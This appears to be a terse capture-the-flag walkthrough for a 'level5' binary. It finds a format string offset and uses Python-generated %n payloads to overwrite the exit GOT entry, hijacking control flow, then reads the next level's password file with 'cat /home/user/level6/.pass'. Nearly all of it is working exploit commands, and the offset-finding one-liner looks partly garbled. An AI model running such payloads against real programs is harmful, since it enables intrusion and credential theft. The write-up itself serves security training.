Format string exploit

calculate the offset:

EXEC=level5; python -c 'print "AAAA " + "%x " * 99  ' > /tmp/t1 && cat /tmp/t1 - | ./$EXEC > /tmp/t2 | awk -F "41414141" '{print $1}' <<< cat /tmp/t2 > /tmp/t3 && echo "Offset = " &&  awk '{print gsub("[ ]",""+1); exit}' <<< cat /tmp/t3 && rm -rf /tmp/t1 /tmp/t2 /tmp/t3

Offset  = 4

The o function isn't called 0x80484a4 -> 134513828 in decimal

In the n function, we see a call of exit 0x80483d0

python -c 'print "\x08\x04\x83\xd0"[::-1] + "%134513824d" + "%4$n"' > /tmp/ex5 && cat /tmp/ex5 - | ./level5

It doesn't work

Modify directly the value on which the exit function jump. 0x8049838

python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"' > /tmp/ex5 && cat /tmp/ex5 - | ./level5

cat /home/user/level6/.pass
